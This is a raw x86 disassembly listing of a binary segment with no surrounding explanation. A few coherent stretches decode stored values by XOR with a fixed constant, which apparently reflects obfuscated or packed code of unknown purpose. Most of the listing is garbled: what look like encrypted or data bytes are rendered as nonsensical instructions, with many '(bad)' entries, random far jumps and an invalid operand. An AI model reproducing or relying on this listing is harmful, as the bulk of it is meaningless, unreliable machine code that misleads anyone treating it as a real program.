  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x1527e733
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	cmp    eax,0x4b35abf5
  40cc53:	ss ins DWORD PTR es:[edi],dx
  40cc55:	into   
  40cc56:	and    DWORD PTR [esp+ecx*8-0x29],0x54
  40cc5b:	std    
  40cc5c:	fdivrp st(3),st
  40cc5e:	and    al,0xb4
  40cc60:	(bad)  
  40cc61:	push   ebx
  40cc62:	jnp    0x40cc79
  40cc64:	mov    ecx,DWORD PTR [ebx-0xd]
  40cc67:	fdivr  QWORD PTR [ebp+0x19]
  40cc6a:	inc    ebx
  40cc6b:	(bad)  
  40cc6c:	pop    esi
  40cc6d:	popa   
  40cc6e:	mov    cl,0x17
  40cc70:	mul    eax
  40cc72:	mov    dh,BYTE PTR [ebx]
  40cc74:	mov    esp,0x8e823b73
  40cc79:	inc    esi
  40cc7a:	(bad)  
  40cc7b:	rcl    BYTE PTR [esi],0x4a
  40cc7e:	adc    esi,DWORD PTR [edx]
  40cc80:	stc    
  40cc81:	out    dx,al
  40cc82:	dec    esp
  40cc83:	test   eax,0x1d8ff48d
  40cc88:	cbw    
  40cc8a:	fnstenv [edx+0x264062db]
  40cc90:	sub    al,bl
  40cc92:	retf   
  40cc93:	cs push 0xfb0d1773
  40cc99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc9a:	rcr    BYTE PTR [eax+edi*8],cl
  40cc9d:	cmp    dh,ch
  40cc9f:	shl    BYTE PTR [ecx+edi*1-0x11e06211],0x3
  40cca7:	jmp    0x40cd07
  40cca9:	test   ecx,0xb6444544
  40ccaf:	fs call 0x3e6e:0x7135da7c
  40ccb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccb8:	std    
  40ccb9:	push   ebx
  40ccba:	and    eax,0x5e45f18d
  40ccbf:	std    
  40ccc0:	or     esp,DWORD PTR ds:0xd918e91f
  40ccc6:	cmp    ch,dh
  40ccc8:	je     0x40cc73
  40ccca:	lods   eax,DWORD PTR ds:[esi]
  40cccb:	mov    esi,0x6e0885fd
  40ccd0:	inc    edi
  40ccd1:	retf   0x28fb
  40ccd4:	ret    0x3fd8
  40ccd7:	mov    DWORD PTR [eax-0x71],ecx
  40ccda:	sub    BYTE PTR [eax+0x5552c48],bh
  40cce0:	ja     0x40cd29
  40cce2:	das    
  40cce3:	adc    eax,0xf9551e08
  40cce8:	mov    dh,BYTE PTR [esp+edi*8]
  40cceb:	hlt    
  40ccec:	(bad)  [esi]
  40ccee:	inc    esi
  40ccef:	enter  0x9838,0xa
  40ccf3:	es call 0x7c62:0x2c74ad91
  40ccfb:	or     bl,BYTE PTR [eax+0x30]
  40ccfe:	mov    eax,0xd9a0040c
  40cd03:	push   edx
  40cd04:	sub    BYTE PTR [esi+0x16bb507c],bl
  40cd0a:	iret   
  40cd0b:	or     al,0x34
  40cd0d:	loop   0x40cd00
  40cd0f:	mov    bl,0xc8
  40cd11:	aad    0xbd
  40cd13:	jae    0x40cd1d
  40cd15:	ins    BYTE PTR es:[edi],dx
  40cd16:	cmp    eax,0x6f810ed5
  40cd1b:	sub    DWORD PTR [esi+0x33],ebp
  40cd1e:	mov    ch,0xb8
  40cd20:	shl    BYTE PTR [eax+0x6935ca70],0xb4
  40cd27:	les    edx,FWORD PTR [edi-0x49a25a0b]
  40cd2d:	mov    ds:0x22a6b8c,eax
  40cd32:	test   BYTE PTR [edx-0x3080c615],bl
  40cd38:	sub    al,0xb9
  40cd3a:	(bad)  
  40cd3b:	mov    al,ds:0x151db8f1
  40cd40:	mov    dl,0xc3
  40cd42:	lods   al,BYTE PTR ds:[esi]
  40cd43:	push   ebp
  40cd44:	(bad)  
  40cd45:	scas   al,BYTE PTR es:[edi]
  40cd46:	mov    ds:0x73175f67,al
  40cd4b:	shl    BYTE PTR [eax],0x33
  40cd4e:	cs inc edx
  40cd50:	enter  0x70d3,0x23
  40cd54:	(bad)  
  40cd55:	cdq    
  40cd56:	in     al,dx
  40cd57:	test   al,0x47
  40cd59:	fidiv  DWORD PTR [edx+0x553803bc]
  40cd5f:	lods   eax,DWORD PTR ds:[esi]
  40cd60:	sbb    ah,ch
  40cd62:	and    bl,al
  40cd64:	jne    0x40cd11
  40cd66:	hlt    
  40cd67:	ja     0x40ccf7
  40cd69:	pushf  
  40cd6a:	xchg   esp,ecx
  40cd6c:	shl    DWORD PTR [edx],0xc7
  40cd6f:	(bad)
  40cd72:	sbb    eax,ebx
  40cd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd75:	pop    ss
  40cd76:	mov    ecx,0x5ea294c6
  40cd7b:	cmp    DWORD PTR [eax+ecx*2],ebp
  40cd7e:	inc    edi
  40cd7f:	int    0x93
  40cd81:	mov    ebx,0xdcd23d5
  40cd86:	pop    ebp
  40cd87:	data16 fwait
  40cd89:	push   esp
  40cd8a:	dec    ecx
  40cd8b:	scas   al,BYTE PTR es:[edi]
  40cd8c:	xchg   ecx,eax
  40cd8d:	cli    
  40cd8e:	pop    esp
  40cd8f:	push   ecx
  40cd90:	push   esp
  40cd91:	push   ecx
  40cd92:	push   edi
  40cd93:	call   0x501d:0xbd1a6956
  40cd9a:	jmp    0x40cda4
  40cd9c:	xchg   esi,eax
  40cd9d:	loop   0x40ce0e
  40cd9f:	shr    DWORD PTR fs:[eax],0x5a
  40cda3:	je     0x40cd34
  40cda5:	mov    ds:0x5f9310e9,eax
  40cdaa:	(bad)  
  40cdab:	std    
  40cdac:	push   esp
  40cdad:	push   ebp
  40cdae:	sbb    al,0xd
  40cdb0:	pop    es
  40cdb1:	div    DWORD PTR [esi+0x501eb83e]
  40cdb7:	js     0x40cd5b
  40cdb9:	xchg   DWORD PTR [eax+0x79c60e30],eax
  40cdbf:	icebp  
  40cdc0:	je     0x40cd75
  40cdc2:	pop    edx
  40cdc3:	mov    ah,BYTE PTR [ebx]
  40cdc5:	mov    ebp,0xec96523a
  40cdca:	pop    es
  40cdcb:	sahf   
  40cdcc:	ret    
  40cdcd:	addr16 push edx
  40cdcf:	cdq    
  40cdd0:	fadd   QWORD PTR [edi]
  40cdd2:	jmp    0x9c4a85b2
  40cdd7:	jno    0x40ce0d
  40cdd9:	push   ss
  40cdda:	xor    ah,dh
  40cddc:	outs   dx,DWORD PTR ds:[esi]
  40cddd:	adc    dl,BYTE PTR [edx-0x6c]
  40cde0:	nop
  40cde1:	data16 adc cl,BYTE PTR [esi-0x6a]
  40cde5:	inc    esp
  40cde6:	jo     0x40ce26
  40cde8:	xor    BYTE PTR [ebp-0x5ed1ff40],ch
  40cdee:	mov    eax,0x5abd509b
  40cdf3:	stos   BYTE PTR es:[edi],al
  40cdf4:	in     eax,dx
  40cdf5:	cmp    eax,DWORD PTR [eax-0x459e9d55]
  40cdfb:	inc    esp
  40cdfc:	loope  0x40ce24
  40cdfe:	je     0x40cd96
  40ce00:	push   0xffffffde
  40ce02:	popa   
  40ce03:	inc    ebp
  40ce04:	outs   dx,BYTE PTR ds:[esi]
  40ce05:	jg     0x40cdec
  40ce07:	(bad)  
  40ce08:	aad    0xaf
  40ce0a:	cli    
  40ce0b:	pop    ecx
  40ce0c:	int    0x27
  40ce0e:	xor    DWORD PTR [eax],ebp
  40ce10:	aaa    
  40ce11:	iret   
  40ce12:	adc    bh,al
  40ce14:	clc    
  40ce15:	rcr    ah,1
  40ce17:	add    DWORD PTR [ebx+esi*1+0x519386f6],0x81a245fb
  40ce22:	jns    0x40cdb3
  40ce24:	inc    eax
  40ce25:	jns    0x40cdd0
  40ce27:	jg     0x40cdca
  40ce29:	push   edx
  40ce2a:	fnstcw WORD PTR [edx]
  40ce2c:	or     ch,cl
  40ce2e:	adc    ebx,edx
  40ce30:	leave  
  40ce31:	imul   ebp,DWORD PTR [ebx+0x4d6a3522],0x9f9521fd
  40ce3b:	mov    ebx,0xf598117c
  40ce40:	enter  0x1847,0x73
  40ce44:	mov    ah,0x33
  40ce46:	clc    
  40ce47:	mov    edx,DWORD PTR [edx-0x2f]
  40ce4a:	mov    WORD PTR [eax-0x9649ef2],gs
  40ce50:	jo     0x40ceca
  40ce52:	dec    esi
  40ce53:	cmp    esp,ebx
  40ce55:	loop   0x40ce5c
  40ce57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce58:	mov    ecx,0x3b225910
  40ce5d:	jmp    0x40ce30
  40ce5f:	call   DWORD PTR [eax]
  40ce61:	xor    ah,cl
  40ce63:	or     DWORD PTR ds:0xc72cf75f,ebx
  40ce69:	mov    esi,0x51fe842d
  40ce6e:	test   DWORD PTR ds:[ebx+esi*8-0x62],ebx
  40ce73:	jns    0x40cedc
  40ce75:	cli    
  40ce76:	out    0x25,eax
  40ce78:	(bad)  
  40ce79:	push   0xc66e235c
  40ce7e:	push   ecx
  40ce7f:	jne    0x40ce7d
  40ce81:	inc    ebp
  40ce82:	addr16 fwait
  40ce84:	scas   al,BYTE PTR es:[edi]
  40ce85:	and    al,BYTE PTR [edx+eiz*4]
  40ce88:	mov    cl,0x93
  40ce8a:	(bad)  
  40ce8b:	stc    
  40ce8c:	call   0xb898:0x88c110b4
  40ce93:	mov    ebp,0x1376c46d
  40ce98:	and    cl,bh
  40ce9a:	outs   dx,DWORD PTR ds:[esi]
  40ce9b:	test   al,0xd9
  40ce9d:	std    
  40ce9e:	iret   
  40ce9f:	dec    ebx
  40cea0:	mov    ds:0x9da2ad68,eax
  40cea5:	add    eax,0x8f860b0a
  40ceaa:	(bad)  
  40ceab:	repnz sub ecx,DWORD PTR ds:0x7d3cc3ef
  40ceb2:	shl    DWORD PTR [edi+0x54],cl
  40ceb5:	cli    
  40ceb6:	rcl    BYTE PTR es:[esi-0x5072f702],cl
  40cebd:	mov    fs,WORD PTR [ecx]
  40cebf:	jb     0x40ce8f
  40cec1:	inc    edi
  40cec2:	push   cs
  40cec3:	xchg   ecx,eax
  40cec4:	in     eax,0x5d
  40cec6:	std    
  40cec7:	push   ebx
  40cec8:	fiadd  WORD PTR [ebp*4+0x2aa6638d]
  40cecf:	inc    ebp
  40ced0:	pop    ds
  40ced1:	sbb    BYTE PTR ds:0x9a8ddf1c,bh
  40ced7:	adc    BYTE PTR [esi-0x1bf3f395],0xe
  40cede:	jbe    0x40ce79
  40cee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cee1:	pop    eax
  40cee2:	lods   al,BYTE PTR ds:[esi]
  40cee3:	icebp  
  40cee4:	fs push ebp
  40cee6:	lods   al,BYTE PTR ds:[esi]
  40cee7:	mov    bl,0x41
  40cee9:	sti    
  40ceea:	mov    cl,0x22
  40ceec:	out    0x3c,eax
  40ceee:	sub    eax,DWORD PTR [ebx]
  40cef0:	push   0xeb9bced9
  40cef5:	mov    bh,0xd3
  40cef7:	mov    ds:0xb710473f,eax
  40cefc:	(bad)  
  40cefe:	adc    ebp,DWORD PTR [eax+ebx*4+0xe52fcf0]
  40cf05:	ror    DWORD PTR [eax-0xc544071],cl
  40cf0b:	jmp    0x40cf4b
  40cf0d:	cwde   
  40cf0e:	clc    
  40cf0f:	popf   
  40cf10:	lods   al,BYTE PTR ds:[esi]
  40cf11:	adc    al,0x90
  40cf13:	inc    ebx
  40cf14:	push   edi
  40cf15:	(bad)  
  40cf16:	loope  0x40cefd
  40cf18:	inc    eax
  40cf19:	sub    ebx,DWORD PTR [ebp+0x51]
  40cf1c:	(bad)  
  40cf1d:	ror    BYTE PTR [ebp-0x7b1d32dc],cl
  40cf23:	jecxz  0x40ceae
  40cf25:	and    BYTE PTR [eax+eax*8-0x52],0xd2
  40cf2a:	or     esi,DWORD PTR [ebp+0x3e]
  40cf2d:	adc    edx,DWORD PTR [edi]
  40cf2f:	repnz into 
  40cf31:	jae    0x40cf10
  40cf33:	add    DWORD PTR [esi-0x1e445194],esp
  40cf39:	ja     0x40cf76
  40cf3b:	mov    cl,0x92
  40cf3d:	(bad)  
  40cf3e:	inc    dh
  40cf40:	cmp    al,0x5f
  40cf42:	fwait
  40cf43:	adc    al,0x3d
  40cf45:	or     bl,dh
  40cf47:	rcl    BYTE PTR [edi+eiz*2-0x6127a9e],cl
  40cf4e:	xchg   edi,eax
  40cf4f:	sahf   
  40cf50:	sbb    BYTE PTR [ebx+0x45030c45],cl
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xcb
  40cf80:	xchg   ecx,eax
  40cf81:	inc    edx
  40cf82:	loope  0x40cfa5
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	loope  0x40cf5c
  40cf8d:	test   BYTE PTR [esi-0x6d7ff954],0xf2
  40cf94:	mov    ds:0xc053a056,eax
  40cf99:	test   eax,0x9522ce37
  40cf9e:	das    
  40cf9f:	fimul  DWORD PTR [esi+edx*2-0x14]
  40cfa3:	shl    BYTE PTR [ebp-0x3b607cdf],0x57
  40cfaa:	in     eax,0xa8
  40cfac:	(bad)  
  40cfad:	dec    esi
  40cfae:	aas    
  40cfaf:	dec    ecx
  40cfb0:	mov    al,ds:0x6d06fe87
  40cfb5:	es inc esi
  40cfb7:	jmp    0x67a80fe
  40cfbc:	mov    es,WORD PTR [edi+0x68]
  40cfbf:	fcmovnu st,st(0)
  40cfc1:	idiv   esp
  40cfc3:	mov    DWORD PTR [esi+0x5f108748],esi
  40cfc9:	ror    DWORD PTR [edi],1
  40cfcb:	fiadd  WORD PTR [eax+0x6e]
  40cfce:	push   edx
  40cfcf:	cld    
  40cfd0:	pop    ds
  40cfd1:	inc    ebp
  40cfd2:	jmp    0x40cfff
  40cfd4:	repz cmp ch,al
  40cfd7:	sub    al,0xdf
  40cfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfda:	jno    0x40cfb8
  40cfdc:	in     al,dx
  40cfdd:	imul   esp,DWORD PTR [ecx],0x56
  40cfe0:	gs jns 0x40d04c
  40cfe3:	jb     0x40cfd2
  40cfe5:	out    0x6b,eax
  40cfe7:	lahf   
  40cfe8:	loopne 0x40cf73
  40cfea:	adc    esi,DWORD PTR [ecx]
  40cfec:	and    al,0x34
  40cfee:	push   ss
  40cfef:	jns    0x40cfbb
  40cff1:	sub    eax,0x2ae17ba3
  40cff6:	jmp    0xf9cf62a2
  40cffb:	lea    edi,[esp+ecx*8]
  40cffe:	dec    edx
  40cfff:	xor    ecx,DWORD PTR [edx]
  40d001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d002:	xchg   esp,eax
  40d003:	mov    dl,BYTE PTR [ecx]
  40d005:	imul   esp,ebx,0xdd3f984f
  40d00b:	jge    0x40d073
  40d00d:	out    0xbb,eax
  40d00f:	pop    esi
  40d010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d011:	fisttp DWORD PTR ds:0x9388258b
  40d017:	mov    ch,0x95
  40d019:	hlt    
  40d01a:	mov    eax,0xf72828b6
  40d01f:	imul   edx,DWORD PTR [edx+0x43],0xb07f4633
  40d026:	test   bl,ah
  40d028:	mov    ch,0x49
  40d02a:	xlat   BYTE PTR ds:[ebx]
  40d02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d02c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d02e:	inc    eax
  40d02f:	dec    esp
  40d030:	pushf  
  40d031:	fnsave [edi-0x42]
  40d034:	inc    edi
  40d035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d036:	pop    esp
  40d037:	mov    al,0x1b
  40d039:	mov    eax,ds:0xec57c14b
  40d03e:	test   al,0x65
  40d040:	adc    al,0x4
  40d042:	mov    edi,0x1032c640
  40d047:	clc    
  40d048:	in     al,0xfa
  40d04a:	icebp  
  40d04b:	dec    ebp
  40d04c:	xor    ebp,DWORD PTR [ebx+0x29c94c3f]
  40d052:	pop    edx
  40d053:	jge    0x40cfef
  40d055:	xchg   ch,al
  40d057:	je     0x40d0d0
  40d059:	or     al,0x55
  40d05b:	(bad)  
  40d05c:	(bad)  
  40d05e:	cs cmp eax,0x1d0707d
  40d064:	xor    eax,0xc47efcd4
  40d069:	dec    esi
  40d06a:	fldcw  WORD PTR [eax-0x35]
  40d06d:	(bad)  
  40d06e:	aad    0x73
  40d070:	aas    
  40d071:	scas   eax,DWORD PTR es:[edi]
  40d072:	lods   al,BYTE PTR ds:[esi]
  40d073:	outs   dx,DWORD PTR ds:[esi]
  40d074:	and    BYTE PTR [edi+0x46],ah
  40d077:	imul   edx,DWORD PTR [ebp+0x2645ce2c],0x58f68318
  40d081:	xor    BYTE PTR [edx+ebx*4+0x7c],dh
  40d085:	repz lock sbb al,0xc8
  40d089:	sbb    al,0x3a
  40d08b:	or     DWORD PTR [eax-0xe],ecx
  40d08e:	in     eax,dx
  40d08f:	pop    ss
  40d090:	adc    edx,esi
  40d092:	bsr    ecx,DWORD PTR [ecx]
  40d095:	not    BYTE PTR [esi-0x31]
  40d098:	jno    0x40d01a
  40d09a:	jne    0x40d095
  40d09c:	hlt    
  40d09d:	shl    BYTE PTR [ecx],1
  40d09f:	cmp    al,0x12
  40d0a1:	xchg   ebx,eax
  40d0a2:	iret   
  40d0a3:	push   ecx
  40d0a4:	or     esp,DWORD PTR [eax]
  40d0a6:	test   al,0xd9
  40d0a8:	mov    BYTE PTR [ebx-0x3a],al
  40d0ab:	or     DWORD PTR [eax+ecx*8+0x7b3b695],0x39
  40d0b3:	and    DWORD PTR [edi+0x4e],ebx
  40d0b6:	cwde   
  40d0b7:	add    eax,0x58bac5b3
  40d0bc:	das    
  40d0bd:	pusha  
  40d0be:	add    eax,0x21f04ea9
  40d0c3:	sbb    al,cl
  40d0c5:	xchg   ebp,eax
  40d0c6:	jmp    0x341cce39
  40d0cb:	or     bh,BYTE PTR [esi+0x7b]
  40d0ce:	xchg   ebx,eax
  40d0cf:	mov    cl,0xb4
  40d0d1:	push   ss
  40d0d2:	jmp    0xe323:0xdd75962c
  40d0d9:	mov    ?,WORD PTR [edi+0x585e5792]
  40d0df:	push   edi
  40d0e0:	pop    es
  40d0e1:	dec    ebp
  40d0e2:	push   edx
  40d0e3:	xchg   ecx,ebx
  40d0e5:	push   ss
  40d0e6:	mov    ds:0xb3e82b2b,eax
  40d0eb:	mov    bh,0xd9
  40d0ed:	mov    bh,0x15
  40d0ef:	aad    0xba
  40d0f1:	adc    al,0x69
  40d0f3:	int3   
  40d0f4:	test   al,0xdd
  40d0f6:	xchg   ecx,eax
  40d0f7:	adc    al,0xc9
  40d0f9:	jbe    0x40d0b9
  40d0fb:	sbb    eax,DWORD PTR [edx+eax*1]
  40d0fe:	push   ecx
  40d0ff:	sub    DWORD PTR [eax],ebx
  40d101:	rol    ah,0xb1
  40d104:	cmp    DWORD PTR [esi+edx*1],0x52
  40d108:	cmp    eax,0xa56c28e2
  40d10d:	jle    0x40d0a0
  40d10f:	(bad)  
  40d110:	gs push es
  40d112:	fidiv  WORD PTR [edx+edi*4+0x3e]
  40d116:	pop    esi
  40d117:	pop    esi
  40d118:	repz fnsave [eax]
  40d11b:	in     al,0x24
  40d11d:	fisub  DWORD PTR [edx]
  40d11f:	mov    al,0x30
  40d121:	adc    al,0x3c
  40d123:	push   edi
  40d124:	hlt    
  40d125:	pop    esi
  40d126:	jae    0x40d155
  40d128:	push   eax
  40d129:	test   BYTE PTR [ebp+0x1964f1f0],cl
  40d12f:	rcr    BYTE PTR [eax+0x5bd6af24],cl
  40d135:	shl    BYTE PTR [esi],1
  40d137:	inc    ebp
  40d138:	das    
  40d139:	js     0x40d0d0
  40d13b:	adc    eax,0xe6c5552c
  40d140:	cdq    
  40d141:	mov    eax,0xc49318fa
  40d146:	std    
  40d147:	test   eax,0x7f154294
  40d14c:	mov    bh,0x41
  40d14e:	mov    ebp,0x6eefa420
  40d153:	ja     0x40d1a3
  40d155:	in     eax,0xc9
  40d157:	ss call 0xf70eb0f2
  40d15d:	and    DWORD PTR [edi-0xbd094a4],0xabe65d8a
  40d167:	loope  0x40d199
  40d169:	jo     0x40d116
  40d16b:	loopne 0x40d16a
  40d16d:	sbb    ebx,DWORD PTR [ebx]
  40d16f:	(bad)  
  40d170:	mov    esp,0xf1b3fc53
  40d175:	xor    al,0xf0
  40d177:	not    al
  40d179:	shl    BYTE PTR [ebp-0x20ff305b],1
  40d17f:	jge    0x40d1ed
  40d181:	in     eax,0x4a
  40d183:	xchg   edx,eax
  40d184:	or     ebx,DWORD PTR [edi]
  40d186:	xor    edi,DWORD PTR [edi+0x19]
  40d189:	mov    ah,0x30
  40d18b:	jae    0x40d166
  40d18d:	add    ebx,ebp
  40d18f:	js     0x40d117
  40d191:	(bad)  
  40d192:	xchg   ebp,eax
  40d193:	lea    edi,[ecx]
  40d195:	je     0x40d128
  40d197:	push   0x59
  40d199:	sbb    eax,0x7a57daf7
  40d19e:	jae    0x40d1fa
  40d1a0:	leave  
  40d1a1:	dec    esi
  40d1a2:	xor    dl,ah
  40d1a4:	xchg   DWORD PTR [ebx-0x2d],esi
  40d1a7:	gs loop 0x40d160
  40d1aa:	outs   dx,DWORD PTR ds:[esi]
  40d1ab:	add    al,0x1f
  40d1ad:	stos   DWORD PTR es:[edi],eax
  40d1ae:	jnp    0x40d1a3
  40d1b0:	outs   dx,BYTE PTR ds:[esi]
  40d1b1:	(bad)  
  40d1b2:	sbb    cl,al
  40d1b4:	adc    BYTE PTR [eax],dl
  40d1b6:	add    edi,DWORD PTR [esi]
  40d1b8:	repnz and ah,BYTE PTR [esp+ebp*8]
  40d1bc:	xor    edx,DWORD PTR [ecx+0x28]
  40d1bf:	das    
  40d1c0:	sbb    eax,0xc29fafc
  40d1c5:	mov    ds:0xf8dc019a,eax
  40d1ca:	aad    0x7b
  40d1cc:	push   0x8e34babb
  40d1d1:	sub    bl,BYTE PTR [ecx+0x3b]
  40d1d4:	pop    edx
  40d1d5:	pusha  
  40d1d6:	inc    edx
  40d1d7:	ret    
  40d1d8:	(bad)  
  40d1d9:	mov    dl,dl
  40d1db:	xacquire xrelease xchg BYTE PTR [eax],ah
  40d1df:	push   ds
  40d1e0:	dec    BYTE PTR [edx-0x4c]
  40d1e3:	xor    ebp,DWORD PTR [ebp+esi*2-0x3227e91c]
  40d1ea:	mov    bl,0x70
  40d1ec:	nop
  40d1ed:	xor    dh,ah
  40d1ef:	xchg   esp,eax
  40d1f0:	out    0xc5,eax
  40d1f2:	mov    ecx,0xfb285b29
  40d1f7:	sub    al,0xa1
  40d1f9:	dec    eax
  40d1fa:	push   eax
  40d1fb:	mov    BYTE PTR [ebx],ch
  40d1fd:	add    DWORD PTR ds:0x3169775a,esp
  40d203:	leave  
  40d204:	push   cs
  40d205:	mov    bl,0xfb
  40d207:	push   ss
  40d208:	fdiv   DWORD PTR [ecx]
  40d20a:	or     bh,dh
  40d20c:	jb     0x40d20b
  40d20e:	jmp    0x22e3:0x1f798113
  40d215:	adc    eax,0xc6b42af7
  40d21a:	scas   eax,DWORD PTR es:[edi]
  40d21b:	push   ss
  40d21c:	sub    DWORD PTR [ecx-0x7b03037e],edx
  40d222:	sar    BYTE PTR [ecx-0x22],1
  40d225:	push   ebp
  40d226:	test   ebp,ebx
  40d228:	leave  
  40d229:	in     eax,dx
  40d22a:	out    dx,eax
  40d22b:	pop    edx
  40d22c:	cdq    
  40d22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d22e:	xchg   edi,eax
  40d22f:	mov    bl,ah
  40d231:	or     ch,dh
  40d233:	cmp    DWORD PTR [ebx+esi*2],0x2e211b0d
  40d23a:	ror    BYTE PTR [esi],cl
  40d23c:	xlat   BYTE PTR ds:[ebx]
  40d23d:	jae    0x40d23d
  40d23f:	cmp    esp,DWORD PTR [esi+ebp*8]
  40d242:	ss (bad) 
  40d244:	fcmove st,st(4)
  40d246:	and    ch,al
  40d248:	inc    esp
  40d249:	sbb    BYTE PTR [ebx],cl
  40d24b:	jg     0x40d25b
  40d24d:	and    al,0x82
  40d24f:	mov    ds:0x66368126,eax
  40d254:	xchg   BYTE PTR [edx+0x77e6321],cl
  40d25a:	repnz mov esp,0xb8aedcc1
  40d260:	mov    ss:0x2eacc340,al
  40d266:	dec    edx
  40d267:	sbb    eax,0x890cbba7
  40d26c:	int3   
  40d26d:	out    0x5f,al
  40d26f:	add    ch,BYTE PTR [esi+0x36629fa5]
  40d275:	cmc    
  40d276:	lods   al,BYTE PTR ds:[esi]
  40d277:	inc    edx
  40d278:	sbb    ebp,ecx
  40d27a:	adc    cl,ah
  40d27c:	lea    edx,[edx]
  40d27e:	xchg   esp,edx
  40d280:	popf   
  40d281:	jae    0x40d2ef
  40d283:	repnz test al,0x89
  40d286:	mov    edx,0xd27fd217
  40d28b:	mov    bl,0x9c
  40d28d:	xchg   edi,eax
  40d28e:	pop    ebx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	cmc    
  40d2d1:	pop    ds
  40d2d2:	out    0x6e,al
  40d2d4:	sub    al,0x95
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	and    bl,BYTE PTR [ebx-0x24]
  40d2df:	pop    ebp
  40d2e0:	push   esi
  40d2e1:	push   ss
  40d2e2:	pop    edi
  40d2e3:	mov    ah,BYTE PTR [esi]
  40d2e5:	in     al,dx
  40d2e6:	popf   
  40d2e7:	outs   dx,DWORD PTR ds:[esi]
  40d2e8:	outs   dx,BYTE PTR ds:[esi]
  40d2e9:	or     bh,BYTE PTR ds:0x14e917c2
  40d2ef:	(bad)  
  40d2f0:	jle    0x40d34f
  40d2f2:	jo     0x40d36b
  40d2f4:	and    ebp,eax
  40d2f6:	pop    es
  40d2f7:	div    esi
  40d2f9:	sub    ch,dh
  40d2fb:	ins    WORD PTR es:[edi],dx
  40d2fd:	xchg   esp,eax
  40d2fe:	stc    
  40d2ff:	xchg   esp,eax
  40d300:	es in  al,0x3
  40d303:	cmp    DWORD PTR [ebx-0x10],ebx
  40d306:	add    cl,BYTE PTR [ebx+0x1c51b4bb]
  40d30c:	(bad)  
  40d30e:	retf   0xa82e
  40d311:	sub    eax,0x284fcb2b
  40d316:	jmp    0xc189:0xee7ac6c8
  40d31d:	dec    edi
  40d31e:	jb     0x40d325
  40d320:	outs   dx,BYTE PTR ds:[esi]
  40d321:	cmp    DWORD PTR [ebp-0x6ab10055],ecx
  40d327:	rcl    BYTE PTR ds:0x3f4fc50b,cl
  40d32d:	dec    edx
  40d32e:	mov    bh,0x6f
  40d330:	jo     0x40d343
  40d332:	imul   esp,DWORD PTR [eax],0xffffff82
  40d335:	push   DWORD PTR [eax]
  40d337:	sub    cl,dl
  40d339:	das    
  40d33a:	and    DWORD PTR [edx-0x439ee383],0x72
  40d341:	xchg   edx,eax
  40d342:	cmc    
  40d343:	jnp    0x40d310
  40d345:	test   eax,0xf4c8088
  40d34a:	mov    edi,0x39848ea7
  40d34f:	(bad)  
  40d350:	int    0x60
